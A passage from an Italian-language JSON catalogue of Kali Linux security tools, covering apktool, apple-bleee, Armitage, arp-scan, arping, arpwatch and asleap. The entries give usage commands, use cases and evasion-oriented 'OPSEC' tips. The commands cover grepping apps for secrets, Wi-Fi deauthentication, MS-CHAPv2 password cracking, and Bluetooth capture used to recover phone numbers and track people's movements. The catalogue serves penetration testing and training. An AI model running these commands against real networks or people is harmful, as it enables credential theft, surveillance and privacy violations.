completa\napktool d target.apk -o output_dir\n\n# Decompilazione senza risorse (solo codice)\napktool d target.apk -o output_dir -r\n\n# Decompilazione senza smali (solo risorse)\napktool d target.apk -o output_dir -s\n\n# === ANALISI STRUTTURA ===\n# Dopo decompilazione, struttura tipica:\n# output_dir/\n# ├── AndroidManifest.xml    # Permessi, activities, services\n# ├── apktool.yml            # Metadata apktool\n# ├── res/                   # Risorse (layout, drawable, values)\n# ├── smali/                 # Codice decompilato (smali assembly)\n# ├── assets/                # File raw (config, certificati)\n# └── lib/                   # Native libraries (.so)\n\n# === RICERCA SECRETS ===\n# Cerca API keys hardcoded\ngrep -r \"api_key\\|apikey\\|secret\\|password\\|token\" output_dir/\ngrep -rE \"[A-Za-z0-9]{32,}\" output_dir/res/values/strings.xml\n\n# Cerca URL di backend\ngrep -rE \"https?://[a-zA-Z0-9.-]+\" output_dir/\n\n# === MODIFICA E RICOMPILAZIONE ===\n# Modifica file (es. bypass SSL pinning in smali)\n# Ricompila\napktool b output_dir -o modified.apk\n\n# === FIRMA APK ===\n# Genera keystore (una tantum)\nkeytool -genkey -v -keystore my-release-key.jks -keyalg RSA \\\n  -keysize 2048 -validity 10000 -alias my-alias\n\n# Firma con apksigner (raccomandato)\napksigner sign --ks my-release-key.jks --out signed.apk modified.apk\n\n# Verifica firma\napksigner verify --verbose signed.apk\n\n# === ZIPALIGN (opzionale, migliora performance) ===\nzipalign -v 4 signed.apk aligned.apk\n\n# === INSTALLAZIONE ===\nadb install aligned.apk\n\n# === FRAMEWORK PER APP SISTEMA ===\n# Estrai framework dal device\nadb pull /system/framework/framework-res.apk\napktool if framework-res.apk\n\n# Per Samsung\nadb pull /system/framework/twframework-res.apk\napktool if twframework-res.apk -t samsung</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Mobile Pentesting</strong>, permette di analizzare il codice per trovare hardcoded secrets, API key esposte, endpoint nascosti, logica di autenticazione vulnerabile e bypass di controlli client-side.</p><p>Nell'<strong>Analisi Malware</strong>, consente di esaminare il comportamento di app sospette, identificare C2 server, tecniche di persistence e payload nascosti.</p><p>Per <strong>SSL Pinning Bypass</strong>, modificando il codice smali si può disabilitare il certificate pinning per intercettare il traffico HTTPS.</p><p>Per <strong>Bug Bounty</strong>, è il primo passo per analizzare app Android: cerca IDOR, broken authentication, information disclosure.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Decompila in smali (assembly), non in Java. Per codice Java più leggibile, usare jadx o JADX-GUI. App con protezioni (ProGuard, DexGuard, R8) producono codice offuscato con nomi di classi/metodi randomizzati.</p><p><strong>Anti-Tampering:</strong> Molte app verificano l'integrità (signature check, SafetyNet/Play Integrity). Dopo la modifica, potrebbero non funzionare o rilevare il tampering.</p><p><strong>Native Code:</strong> Apktool non decompila librerie native (.so). Per queste usare Ghidra, IDA Pro o radare2.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "apple-bleee",
    "name": "apple-bleee",
    "version": "0.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/apple-bleee/",
    "desc": "Sfrutta vulnerabilità BLE di dispositivi Apple per estrarre numeri di telefono e info.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Apple-bleee</strong> sfrutta le debolezze nei protocolli BLE (Bluetooth Low Energy) proprietari di Apple per estrarre informazioni sensibili dai dispositivi iOS e macOS nelle vicinanze. I dispositivi Apple trasmettono costantemente pacchetti BLE per funzionalità come AirDrop, Handoff, Wi-Fi Password Sharing, Apple Watch Unlock e Continuity, contenenti hash parziali di numeri di telefono, email e Apple ID che possono essere craccati offline per de-anonimizzare gli utenti. La vulnerabilità deriva dall'uso di hash SHA256 troncati a soli 3 byte, che possono essere bruteforcati in pochi minuti dato lo spazio limitato dei numeri telefonici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Phone Number Extraction:</strong> Cattura gli hash SHA256 troncati (3 byte) dei numeri di telefono trasmessi durante le richieste AirDrop. Con GPU cracking o rainbow tables pre-calcolate per prefissi nazionali, il numero completo viene recuperato in minuti.</p><p><strong>Email Hash Capture:</strong> Intercetta gli hash parziali degli indirizzi email Apple ID trasmessi durante Handoff e Universal Clipboard, correlabili con leak database.</p><p><strong>Device Fingerprinting:</strong> Identifica modello esatto del dispositivo, versione iOS/macOS e stato (schermo on/off, chiamata attiva, AirPods connessi, batteria in carica) dai byte di stato nei pacchetti BLE.</p><p><strong>Presence Tracking:</strong> Monitora la presenza continuativa di dispositivi specifici tracciando i pattern di advertising BLE, anche con MAC randomization attiva (Apple usa identificatori persistenti nei payload).</p><p><strong>Wi-Fi Password Sharing Attack:</strong> Sfrutta il protocollo di condivisione password Wi-Fi per estrarre hash di SSID e credenziali parziali quando due dispositivi Apple sono vicini.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede un adattatore Bluetooth 4.0+ compatibile con modalità monitor BLE (es. CSR 4.0, Ubertooth One, o chip interno su Linux).</p><pre><code># === SETUP AMBIENTE ===\ngit clone https://github.com/hexway/apple_bleee\ncd apple_bleee\npip3 install -r requirements.txt\n\n# Verifica adattatore BLE\nhciconfig hci0 up\nhcitool lescan  # Test scansione\n\n# === SCANSIONE DISPOSITIVI ===\n# Scansione passiva dispositivi Apple (mostra stato, modello)\npython3 ble_read_state.py\n\n# Output: Device, State, WiFi, OS, Phone hash, Email hash\n# Esempio: iPhone 12, Screen On, WiFi On, iOS 15, 0x1a2b3c, 0x4d5e6f\n\n# === ESTRAZIONE NUMERI TELEFONO ===\n# Cattura hash durante richieste AirDrop\npython3 airdrop_leak.py\n\n# Genera rainbow table per prefissi italiani\npython3 hash_generate.py --prefix +39 --output it_phones.txt\n\n# Cracca hash catturato\ngrep \"1a2b3c\" it_phones.txt\n# Output: +393331234567 -> 1a2b3c...\n\n# === TRACKING CONTINUO ===\n# Monitor prolungato con logging\npython3 ble_read_state.py --log devices.csv --interval 5\n\n# Analisi presenza nel tempo\ncat devices.csv | sort | uniq -c | sort -rn</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Physical Pentesting</strong>, permette di identificare e profilare dipendenti target tramite i loro dispositivi Apple prima di un attacco di social engineering, ottenendo numeri di telefono per vishing o smishing.</p><p>In operazioni di <strong>Red Team</strong>, il tracking BLE rivela pattern di movimento dei target (orari di arrivo, pause, riunioni) senza accesso fisico all'edificio.</p><p>Per <strong>Threat Intelligence</strong>, correlare hash email con breach database permette di identificare utenti specifici in luoghi pubblici.</p><p>Essenziale per <strong>Privacy Research</strong> e awareness training, dimostrando i rischi concreti della trasmissione BLE always-on dei dispositivi Apple.</p><p>In <strong>TSCM</strong> (Technical Surveillance Countermeasures), identifica dispositivi Apple nascosti che potrebbero registrare audio/video.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> L'intercettazione di comunicazioni Bluetooth è illegale in molte giurisdizioni (GDPR, Wiretap laws). Usare esclusivamente con autorizzazione scritta e in contesti di security assessment autorizzato.</p><p><strong>Hardware Detection:</strong> La scansione BLE attiva può essere rilevata da app di sicurezza sui dispositivi target. Preferire modalità passiva.</p><p><strong>Range Limitato:</strong> BLE ha range effettivo di ~10-30 metri. Posizionarsi in aree ad alto traffico per massimizzare le catture.</p><p><strong>Mitigazioni Apple:</strong> iOS 13.5+ ha ridotto la frequenza di broadcast e randomizza alcuni campi, ma gli hash telefono/email rimangono vulnerabili durante AirDrop attivo.</p><p><strong>Correlazione:</strong> Per il cracking efficace, pre-generare rainbow tables per i prefissi telefonici del paese target (+39 per Italia, +1 per USA, ecc.).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "armitage",
    "name": "armitage",
    "version": "20221206",
    "icon": "../app/icons/armitage-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/armitage/",
    "desc": "GUI per Metasploit che visualizza target, sessioni e facilita attacchi collaborativi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Armitage</strong> è un'interfaccia grafica per Metasploit Framework che semplifica la gestione di penetration test complessi. Visualizza la rete target come un grafo interattivo dove gli host sono colorati per OS (Windows blu, Linux rosso, altri verde) e cambiano icona quando compromessi. Permette di lanciare exploit con pochi click, gestisce sessioni Meterpreter/shell multiple simultaneamente con interfaccia tabbed, e include un team server per operazioni collaborative multi-operatore. Armitage astrae la complessità di Metasploit mantenendo accesso completo alla console per operazioni avanzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network Visualization:</strong> Rappresenta la rete come grafo interattivo con icone per OS, stato compromissione (fulmine rosso = shell), e relazioni di pivoting. Zoom, pan e raggruppamento automatico per reti grandi.</p><p><strong>Smart Exploitation:</strong> Click destro su host mostra solo exploit applicabili filtrati per OS/servizi rilevati. Ranking automatico per probabilità di successo.</p><p><strong>Hail Mary Attack:</strong> Lancia automaticamente tutti gli exploit applicabili contro target selezionati in parallelo. Utile per CTF o quick wins, ma estremamente rumoroso.</p><p><strong>Session Management:</strong> Interfaccia tabbed per gestire decine di shell simultanee. Meterpreter integrato con file browser, screenshot, keylogger, hashdump accessibili via menu.</p><p><strong>Pivoting Grafico:</strong> Configura route attraverso sessioni compromesse con drag-and-drop. Visualizza i path di pivoting nel grafo.</p><p><strong>Team Server:</strong> Backend dedicato che permette a più operatori di connettersi, condividere sessioni, vedere azioni in tempo reale, e chattare. Logging centralizzato di tutte le operazioni.</p><p><strong>Scripting Cortana:</strong> Linguaggio di scripting integrato per automatizzare workflow complessi, trigger su eventi, e personalizzazione UI.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP STANDALONE ===\n# Inizializza database PostgreSQL per Metasploit\nsudo msfdb init\n\n# Avvia Armitage (gestisce msfrpcd automaticamente)\nsudo armitage\n# Clicca 'Yes' per avviare RPC, attendi connessione\n\n# === SETUP TEAM SERVER ===\n# Sul server centrale\nsudo teamserver 192.168.1.100 SharedPassword123\n# Output: Team server running on 55553\n\n# I client si connettono specificando IP team server\narmitage\n# Host: 192.168.1.100, Port: 55553, Pass: SharedPassword123\n\n# === WORKFLOW DISCOVERY ===\n# Hosts > Nmap Scan > Intense Scan\n# Oppure importa scan esistente: Hosts > Import Hosts\n\n# === EXPLOITATION MANUALE ===\n# 1. Seleziona host nel grafo\n# 2. Click destro > Attack > trova exploit\n# 3. Configura opzioni nel dialog\n# 4. Click 'Launch'\n\n# === POST-EXPLOITATION ===\n# Su host compromesso (icona fulmine):\n# Click destro > Meterpreter > Interact > Meterpreter Shell\n# Click destro > Meterpreter > Access > Dump Hashes\n# Click destro > Meterpreter > Explore > Browse Files\n# Click destro > Meterpreter > Pivoting > Setup\n\n# === AUTOMAZIONE CORTANA ===\n# Armitage > Scripts > Load per caricare script .cna\n# Esempio script per auto-migrate su compromissione:\n# on session_open { migrate($1); }</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale per <strong>Formazione</strong>, permette a studenti di visualizzare concetti di networking e exploitation senza memorizzare sintassi Metasploit.</p><p>In <strong>CTF e Lab</strong>, Hail Mary automatizza l'exploitation di macchine vulnerabili note, accelerando significativamente il tempo di compromissione.</p><p>Per <strong>Team Engagement</strong> con più pentester, il team server centralizza sessioni e log evitando duplicazioni di lavoro e conflitti.</p><p>Utile per <strong>Reporting</strong>: il logging automatico e la visualizzazione grafica facilitano la documentazione del percorso di attacco.</p><p>In <strong>Demo per Management</strong>, la rappresentazione visiva dell'attacco è più comprensibile di output CLI per stakeholder non tecnici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumorosità:</strong> Hail Mary lancia centinaia di exploit in pochi minuti, generando alert massivi su qualsiasi IDS/SIEM. Mai usare in engagement reali.</p><p><strong>Default Signatures:</strong> Armitage usa payload Metasploit standard facilmente rilevati da AV. Per evasion, generare payload custom con msfvenom e caricarli manualmente.</p><p><strong>Team Server Security:</strong> Il traffico team server non è cifrato di default. Usare VPN o SSH tunnel per connessioni remote.</p><p><strong>Database Exposure:</strong> Il database PostgreSQL contiene tutti i dati dell'engagement. Proteggere l'accesso e cancellare dopo il progetto.</p><p><strong>Logging:</strong> Armitage logga tutto in ~/.armitage/. Verificare di non lasciare dati sensibili su sistemi condivisi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "arp-scan",
    "name": "arp-scan",
    "version": "1.10.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/arp-scan/",
    "desc": "Scansiona reti locali via ARP per scoprire host attivi e MAC address.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Arp-scan</strong> è uno strumento di discovery di rete veloce e affidabile che utilizza il protocollo ARP per identificare tutti gli host attivi su una rete locale. A differenza delle scansioni IP/ICMP che possono essere bloccate da firewall host-based, ARP opera a livello 2 (Data Link) ed è obbligatorio per la comunicazione Ethernet - ogni host DEVE rispondere alle ARP request per il proprio IP, rendendo impossibile nascondersi. Questo garantisce la scoperta del 100% dei dispositivi attivi nel segmento di rete, inclusi quelli con firewall restrittivi, modalità stealth, o che non rispondono a ping/portscan.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Layer 2 Discovery:</strong> Invia ARP request e raccoglie le risposte per mappare IP a MAC address. Bypasssa completamente firewall software, ACL, e configurazioni stealth.</p><p><strong>OUI Vendor Lookup:</strong> Correla i primi 3 byte del MAC address al database IEEE OUI per identificare il produttore del dispositivo (Cisco, HP, Apple, ecc.), utile per fingerprinting.</p><p><strong>Duplicate Detection:</strong> Identifica IP duplicati nella rete (possibile indicatore di ARP spoofing o misconfiguration).</p><p><strong>Custom MAC Spoofing:</strong> Permette di specificare un MAC sorgente arbitrario per la scansione, utile per testare NAC o eludere whitelist.</p><p><strong>Bandwidth Control:</strong> Regola la velocità di scansione per evitare flooding su reti sensibili o switch con port security.</p><p><strong>Output Formats:</strong> Supporta output plain, XML per parsing automatico, e integrazione con altri tool.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANSIONE BASE ===\n# Scansione rete locale (auto-detect interfaccia e subnet)\nsudo arp-scan --localnet\n\n# Scansione subnet specifica\nsudo arp-scan 192.168.1.0/24\n\n# Scansione con interfaccia specifica\nsudo arp-scan -I eth0 10.0.0.0/24\n\n# === OPZIONI AVANZATE ===\n# Scansione lenta per evitare detection (100ms tra pacchetti)\nsudo arp-scan --localnet --interval=100\n\n# Retry multipli per host instabili (default: 2)\nsudo arp-scan --localnet --retry=3\n\n# Spoofing MAC sorgente\nsudo arp-scan --localnet --srcaddr=00:11:22:33:44:55\n\n# Scansione range specifico\nsudo arp-scan 192.168.1.100-192.168.1.200\n\n# Scansione da file lista IP\nsudo arp-scan --file=targets.txt\n\n# === OUTPUT E PARSING ===\n# Output solo IP (per pipeline)\nsudo arp-scan --localnet --plain | cut -f1\n\n# Aggiorna database OUI\nsudo arp-scan --update-oui\n\n# === WORKFLOW INTEGRATI ===\n# Discovery + Port scan immediato\nsudo arp-scan --localnet | grep -oP '^\\d+\\.\\d+\\.\\d+\\.\\d+' | xargs -I{} nmap -sV {}\n\n# Trova tutti i dispositivi di un vendor specifico (es. Cisco)\nsudo arp-scan --localnet | grep -i cisco\n\n# Export per analisi\nsudo arp-scan --localnet -x > network_inventory.xml</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Primo passo essenziale in ogni <strong>Internal Network Pentest</strong> per enumerare rapidamente il 100% degli host attivi nella VLAN, inclusi quelli invisibili a scansioni ICMP/TCP.</p><p>Per <strong>Asset Discovery</strong>, identifica dispositivi shadow IT, IoT non autorizzati, e apparati di rete che potrebbero non essere documentati.</p><p>In <strong>Incident Response</strong>, permette di mappare rapidamente tutti i dispositivi su un segmento compromesso per contenimento.</p><p>Utile per <strong>Network Inventory</strong> e compliance, fornendo lista completa IP/MAC/Vendor esportabile per documentazione.</p><p>Nel <strong>Troubleshooting</strong>, rileva conflitti IP e problemi di configurazione DHCP visualizzando MAC duplicati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Scope Limitato:</strong> ARP funziona SOLO sulla stessa VLAN/broadcast domain. Non può attraversare router o VLAN diverse. Per reti segmentate, necessario accesso a ciascun segmento.</p><p><strong>Detection:</strong> Le ARP request sono traffico normale, ma un burst da un singolo MAC può triggerare alert su switch managed o SIEM. Usare --interval per rallentare.</p><p><strong>Port Security:</strong> Switch con port security possono bloccare il MAC se si supera il limite di indirizzi o si usa MAC spoofing.</p><p><strong>ARP Inspection:</strong> Reti con Dynamic ARP Inspection (DAI) possono bloccare scan con MAC spoofato se non corrisponde alla tabella DHCP snooping.</p><p><strong>Logging Switch:</strong> Gli switch enterprise loggano le tabelle MAC. La scansione lascia tracce associabili alla porta fisica.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "arping",
    "name": "arping",
    "version": "2.26",
    "icon": "../app/icons/arping-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/arping/",
    "desc": "Ping ARP per verificare host attivi in rete locale, bypassa firewall IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Arping</strong> è l'equivalente ARP del comando ping ICMP, ma opera a livello 2 (Data Link). Invia richieste ARP Who-has a un indirizzo IP specifico e attende la risposta is-at contenente il MAC address. A differenza del ping ICMP, le ARP request non possono essere bloccate da firewall software perché sono necessarie per il funzionamento base della rete Ethernet. Questo lo rende ideale per verificare la presenza di host \"stealth\" che non rispondono a ping, e per diagnosticare problemi di rete a livello 2.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Host Liveness Check:</strong> Verifica la presenza di un host a livello 2, completamente indipendente da firewall IP/ICMP. Se l'host è fisicamente connesso e ha quell'IP, DEVE rispondere.</p><p><strong>MAC Address Resolution:</strong> Restituisce il MAC address associato all'IP target, permettendo fingerprinting del vendor tramite OUI.</p><p><strong>Duplicate IP Detection:</strong> Modalità DAD (Duplicate Address Detection) rileva se più host rispondono allo stesso IP - indicatore di conflitto di configurazione o attacco ARP spoofing attivo.</p><p><strong>Latency Measurement:</strong> Misura il round-trip time a livello 2, utile per diagnosticare problemi di performance dello switch.</p><p><strong>Gratuitous ARP:</strong> Può inviare ARP gratuite per aggiornare le cache ARP di altri host (usato in failover o testing).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === VERIFICA HOST SINGOLO ===\n# Ping ARP base (continuo fino a Ctrl+C)\nsudo arping 192.168.1.1\n\n# Con count limitato (5 richieste)\nsudo arping -c 5 192.168.1.1\n\n# Specificando interfaccia di rete\nsudo arping -I eth0 192.168.1.1\n\n# === DUPLICATE DETECTION ===\n# Rileva IP duplicati (DAD mode)\nsudo arping -D -c 3 192.168.1.100\n# Exit code 0 = IP libero, 1 = IP già in uso\n\n# === OPZIONI AVANZATE ===\n# Timeout per risposta (default 1s)\nsudo arping -w 5 192.168.1.1\n\n# Solo prima risposta (quit after first reply)\nsudo arping -f 192.168.1.1\n\n# MAC sorgente personalizzato\nsudo arping -s 00:11:22:33:44:55 192.168.1.1\n\n# Broadcast ARP (trova tutti gli host)\nsudo arping -b 192.168.1.255\n\n# === DIAGNOSTICA ===\n# Verifica gateway raggiungibile\nsudo arping -c 3 $(ip route | grep default | awk '{print $3}')\n\n# Script per verificare range\nfor ip in 192.168.1.{1..254}; do\n  sudo arping -c 1 -w 1 $ip 2>/dev/null && echo \"$ip UP\"\ndone</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Troubleshooting</strong>, verifica se un host è raggiungibile a livello 2 quando non risponde a ping ICMP, distinguendo problemi di routing da problemi di connettività fisica.</p><p>Per <strong>Security Audit</strong>, la modalità DAD rileva conflitti IP che potrebbero indicare ARP spoofing attivo o misconfiguration DHCP.</p><p>Nel <strong>Pentesting</strong>, conferma la presenza di target stealth che hanno ICMP disabilitato o firewall restrittivi.</p><p>Per <strong>Failover Testing</strong>, verifica che le ARP gratuite propaghino correttamente durante switchover di cluster.</p><p>In <strong>Network Forensics</strong>, correla IP a MAC address per identificare dispositivi specifici durante incident response.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Scope Layer 2:</strong> Funziona SOLO sulla stessa VLAN/broadcast domain. Non può attraversare router.</p><p><strong>Detection:</strong> Richieste ARP ripetute verso un singolo IP possono essere notate da IDS/arpwatch come comportamento anomalo.</p><p><strong>Rate Limiting:</strong> Alcuni switch enterprise limitano il rate di ARP per porta per prevenire flooding.</p><p><strong>Logging:</strong> Le risposte ARP aggiornano le tabelle MAC degli switch, lasciando tracce nei log.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "arpwatch",
    "name": "arpwatch",
    "version": "2.1a15",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/arpwatch/",
    "desc": "Monitora attività ARP per rilevare nuovi host e possibili attacchi ARP spoofing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Arpwatch</strong> è un demone di monitoraggio passivo che osserva tutto il traffico ARP su una rete locale, costruendo e mantenendo un database persistente delle associazioni IP/MAC address. Quando rileva anomalie - nuovi host mai visti, cambio del MAC per un IP esistente (possibile spoofing), o flip-flop rapidi tra MAC diversi - genera alert via email, syslog o script custom. È uno strumento difensivo fondamentale per rilevare attacchi ARP spoofing/poisoning, dispositivi rogue, e cambiamenti non autorizzati nell'infrastruttura di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP/MAC Database:</strong> Mantiene uno storico persistente su disco (arp.dat) delle associazioni IP-MAC osservate, con timestamp del primo e ultimo avvistamento.</p><p><strong>New Station Detection:</strong> Alert quando un nuovo IP o MAC mai visto prima appare sulla rete - possibile dispositivo non autorizzato o attaccante.</p><p><strong>Changed Ethernet Address:</strong> Segnala quando un IP noto cambia MAC address - indicatore classico di ARP spoofing in corso.</p><p><strong>Flip-Flop Detection:</strong> Rileva quando un IP alterna rapidamente tra MAC diversi - tipico di attacchi ARP attivi o problemi di rete.</p><p><strong>Reused Old Ethernet:</strong> Nota quando un MAC precedentemente associato a un IP riappare con IP diverso.</p><p><strong>Multi-Interface Support:</strong> Può monitorare più interfacce simultaneamente con database separati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP BASE ===\n# Avvio monitoraggio su interfaccia\nsudo arpwatch -i eth0\n\n# Avvio come demone con output personalizzato\nsudo arpwatch -i eth0 -f /var/lib/arpwatch/eth0.dat\n\n# === CONFIGURAZIONE ALERTING ===\n# Specifica email per notifiche\nsudo arpwatch -i eth0 -m admin@example.com\n\n# Solo syslog (no email)\nsudo arpwatch -i eth0 -s\n\n# Debug mode (foreground, verbose)\nsudo arpwatch -i eth0 -d\n\n# === GESTIONE DATABASE ===\n# Visualizza database corrente\ncat /var/lib/arpwatch/arp.dat\n# Format: MAC IP timestamp hostname\n\n# Backup database\ncp /var/lib/arpwatch/arp.dat /backup/arp-$(date +%Y%m%d).dat\n\n# Inizializza con scan corrente (baseline)\nsudo arp-scan --localnet | awk '{print $2\"\\t\"$1}' > /var/lib/arpwatch/arp.dat\n\n# === MULTI-VLAN ===\n# Monitora più interfacce\nsudo arpwatch -i eth0 -f /var/lib/arpwatch/eth0.dat &\nsudo arpwatch -i eth1 -f /var/lib/arpwatch/eth1.dat &\n\n# === ANALISI LOG ===\n# Cerca alert di spoofing nei log\ngrep \"changed ethernet address\" /var/log/syslog\ngrep \"flip flop\" /var/log/syslog\n\n# Report nuovi dispositivi ultima settimana\ngrep \"new station\" /var/log/syslog | grep \"$(date -d '7 days ago' +%b)\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Security Monitoring</strong>, rileva attacchi ARP spoofing/MITM in tempo reale, alertando quando un attaccante tenta di impersonare il gateway o altri host critici.</p><p>In <strong>Intrusion Detection</strong>, identifica dispositivi rogue o non autorizzati che appaiono sulla rete interna.</p><p>Per <strong>Asset Management</strong>, mantiene un inventario automatico di tutti i dispositivi che si connettono alla rete con storico temporale.</p><p>In <strong>Compliance</strong> (PCI-DSS, ISO27001), fornisce audit trail delle connessioni di rete richiesto da molti framework.</p><p>Per <strong>Incident Response</strong>, lo storico permette di ricostruire quando un dispositivo compromesso è apparso per la prima volta.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Per Attaccanti:</strong> La presenza di arpwatch significa che attacchi ARP classici (ettercap, bettercap) saranno rilevati immediatamente. Preferire tecniche che non modificano le associazioni ARP (DNS spoofing, WPAD injection, LLMNR poisoning).</p><p><strong>Evasione:</strong> Usare il MAC originale del target durante l'attacco (MAC originale + proxy) per evitare l'alert di \"changed ethernet address\".</p><p><strong>Per Difensori:</strong> Arpwatch vede solo traffico broadcast/unicast alla sua interfaccia. In reti switched, posizionarlo su una porta SPAN/mirror per visibilità completa.</p><p><strong>Limitazioni:</strong> Non rileva attacchi a livelli superiori (DNS, DHCP, LLMNR) che non coinvolgono modifiche ARP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "asleap",
    "name": "asleap",
    "version": "2.3~git20201128.254acab",
    "icon": "../app/icons/asleap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/asleap/",
    "desc": "Attacca autenticazione LEAP/PPTP estraendo e craccando credenziali MS-CHAPv2.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Asleap</strong> è uno strumento specializzato nell'attacco a protocolli di autenticazione basati su MS-CHAPv2, incluso LEAP (Lightweight Extensible Authentication Protocol) di Cisco e VPN PPTP. La vulnerabilità fondamentale di MS-CHAPv2 sta nell'uso di DES con chiavi derivate dalla password: il challenge-response può essere ridotto a un attacco a soli 2^56 operazioni DES, recuperando la password in chiaro in tempo ragionevole. Nonostante sia deprecato dal 2012 dopo la pubblicazione di Moxie Marlinspike, MS-CHAPv2 rimane diffuso in ambienti enterprise legacy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MS-CHAPv2 Extraction:</strong> Estrae automaticamente challenge, response e username da catture pcap contenenti traffico LEAP, PPTP, o PEAP/MSCHAPv2.</p><p><strong>Pre-computed Tables:</strong> Usa tabelle hash pre-generate (genkeys) per cracking istantaneo di password comuni, evitando computazione ripetuta.</p><p><strong>Dictionary Attack:</strong> Attacco basato su wordlist ottimizzato per la struttura di MS-CHAPv2, più veloce del brute force.</p><p><strong>Live Sniffing:</strong> Modalità real-time che sniffa il traffico wireless e attacca le autenticazioni al volo durante la cattura.</p><p><strong>Username Extraction:</strong> Estrae gli username in chiaro dai pacchetti, fornendo la metà delle credenziali gratuitamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === PREPARAZIONE TABELLE ===\n# Genera tabelle hash da dizionario (una tantum, riutilizzabile)\ngenkeys -r /usr/share/wordlists/rockyou.txt -f wordlist.dat -n index.dat\n# Può richiedere ore per dizionari grandi, ma il risultato è riutilizzabile\n\n# Per password numeriche (PIN)\ngenkeys -r <(seq -w 00000000 99999999) -f pins.dat -n pins_index.dat\n\n# === CATTURA TRAFFICO LEAP/MSCHAPV2 ===\n# Metti interfaccia in monitor mode\nairmon-ng start wlan0\n\n# Cattura traffico sulla rete target (canale specifico)\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n\n# Forza ri-autenticazione con deauth (per catturare handshake)\naireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n\n# === CRACKING OFFLINE ===\n# Crack da cattura pcap con tabelle pre-generate\nasleap -r capture-01.cap -f wordlist.dat -n index.dat\n\n# Output esempio:\n# username: DOMAIN\\jsmith\n# challenge: 1a2b3c4d5e6f7890\n# response: 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b\n# password: Summer2023!\n\n# === ATTACK LIVE ===\n# Sniff e crack in tempo reale\nasleap -i wlan0mon -f wordlist.dat -n index.dat\n\n# === CATTURA VPN PPTP ===\n# Sniffa traffico PPTP (GRE encapsulated)\ntcpdump -i eth0 -w pptp.pcap 'proto gre'\n\n# Estrai e cracca\nasleap -r pptp.pcap -f wordlist.dat -n index.dat\n\n# === WORKFLOW COMPLETO ===\n# 1. Identifica reti LEAP\nairodump-ng wlan0mon | grep LEAP\n\n# 2. Focus sulla rete target e cattura\nairodump-ng -c [CH] --bssid [BSSID] -w leap_capture wlan0mon\n\n# 3. Deauth per forzare handshake\naireplay-ng --deauth 3 -a [BSSID] wlan0mon\n\n# 4. Cracca\nasleap -r leap_capture-01.cap -f wordlist.dat -n index.dat</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting Enterprise</strong>, attacca reti legacy che usano ancora LEAP nonostante sia deprecato da oltre un decennio.</p><p>Per <strong>VPN Assessment</strong>, dimostra la debolezza di 